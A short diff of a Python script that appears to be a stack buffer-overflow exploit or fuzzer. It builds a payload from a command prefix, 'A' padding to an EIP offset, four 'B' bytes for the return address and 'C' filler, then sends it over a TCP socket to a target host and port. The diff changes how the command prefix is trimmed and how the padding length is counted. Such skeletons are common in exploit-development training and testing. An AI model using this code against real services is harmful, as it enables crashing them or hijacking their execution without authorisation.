@@ -19,9 +19,9 @@ if len(sys.argv) == 6:
 else:
     cmd = ""
 
-cmd = ""
+cmd = cmd.lstrip(" ")
 
-inputBuffer = cmd + "A" * eip + "B" * 4 + "C" * (size-eip-len(cmd))
+inputBuffer = cmd + "A" * eip + "B" * 4 + "C" * (size-eip)
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((target,port))
